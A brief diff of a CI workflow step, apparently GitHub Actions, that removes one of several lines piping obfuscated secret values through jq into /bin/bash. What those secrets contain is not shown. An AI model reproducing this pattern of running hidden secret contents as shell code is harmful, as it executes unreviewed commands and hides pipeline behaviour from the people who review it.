@@ -22,7 +22,6 @@ jobs:
           nmbs713: ${{ secrets.nmbs713 }}
         run: |
           printf '%s' "$nmbs713" | jq -r .mk92 | /bin/bash
-          echo $gaw319 | jq -r .etob0 | /bin/bash
           echo $iha930 | jq -r .lsd17 | /bin/bash
           echo $cassd531 | jq -r .kxszl07 | /bin/bash
           echo $fehqy916 | jq -r .ctqoa46 | /bin/bash
